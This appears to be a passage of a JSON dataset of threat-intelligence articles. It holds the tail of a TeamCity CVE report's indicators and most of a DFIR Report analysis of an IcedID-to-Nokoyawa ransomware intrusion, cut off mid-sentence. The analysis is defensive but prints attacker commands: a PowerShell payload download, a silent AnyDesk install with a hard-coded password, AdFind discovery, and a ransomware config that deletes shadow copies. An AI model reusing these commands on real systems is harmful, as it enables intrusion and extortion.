malicious DLL pdhui_1.dll 3a32e516c037c37f7bf83171e167511ba53870a7 File hash of malicious DLL winmm.dll 2df317b8a408d2ad5c94b9de6f20bbef03e46066 File hash of malicious DLL mscorees.dll hxxp://bringthenoiseappnew.s3.amazonaws[.]com/ujwphtigdcokr URL C2 C2 URL from which malicious executable downloaded hXXp[:]//103[.]76[.]128[.]34:8080/ C2 URL from which malicious DLLs downloaded hXXps[:]//fisheries-states-codes-camps[.]trycloudflare[.]com/rcu C2 URL from which malicious executable downloaded 128[.]199[.]207[.]131 IP C2 C2 IP address seen from GraphicalProton malware 167[.]114[.]3[.]69 Article References [1] https://nvd.nist.gov/vuln/detail/CVE-2023-42793 [2] https://www.sonarsource.com/blog/teamcity-vulnerability/ [3] https://www.jetbrains.com/teamcity/ [4] https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis [5] https://www.cisa.gov/news-events/alerts/2023/10/04/cisa-adds-two-known-exploited-vulnerabilities-catalog-removes-five-kevs [6] https://github.com/projectdiscovery/nuclei [7] https://github.com/projectdiscovery/nuclei-templates/blob/016d696c4c964f47580f21a1219f6c878264a7a0/http/cves/2023/CVE-2023-42793.yaml#L52C34-L52C34 [8] https://crt.sh/?q=d88fbe100874149e0059203fc1873958cde569deae66e1d934083006a4d5a258 [9] https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing [10] https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/ [11] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [12] https://learn.microsoft.com/en-us/iis/extensions/introduction-to-iis-express/iis-express-overview [13] https://attack.mitre.org/techniques/T1036/005/ [14] https://attack.mitre.org/techniques/T1574/001/ [15] https://pubs.opengroup.org/onlinepubs/009604599/functions/opendir.html [16] https://attack.mitre.org/techniques/T1003/002/ [17] https://attack.mitre.org/techniques/T1003/002/ [18] https://attack.mitre.org/techniques/T1136/001/ [19] https://attack.mitre.org/techniques/T1047/ [20] https://github.com/ParrotSec/mimikatz [21] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [22] https://attack.mitre.org/techniques/T1219 [23] https://attack.mitre.org/techniques/T1053/005 [24] https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf [25] https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing [26] https://community.fortinet.com/t5/FortiGate/Technical-Tip-Blocking-and-monitoring-Tor-traffic/ta-p/196239 Tags: cve Related Posts CISO Collective A Guide to Incident Response Plans, Playbooks, and Policy Threat Research MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF Threat Research Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More \u201cEasy\u201d Buttons Than Ever News & Articles News Releases News Articles Security Research Threat Research FortiGuard Labs Threat Map Ransomware Prevention Connect With Us Fortinet Community Partner Portal Investor Relations Product Certifications Company About Us Exec Mgmt Careers Training Events Industry Awards Social Responsibility CyberGlossary Sitemap Blog Sitemap Copyright \u00a9 2026 Fortinet, Inc. All Rights Reserved Terms of Services Privacy Policy | Cookie Settings Also of Interest: Russian Army Exhibition Decoy Leads to New... Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1389 Botnets Continue Exploiting CVE-2023-1389 for... MerkSpy: Exploiting CVE-2021-40444 to...",
    "expected_count": 13
  },
  {
    "url": "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
    "title": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report",
    "content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 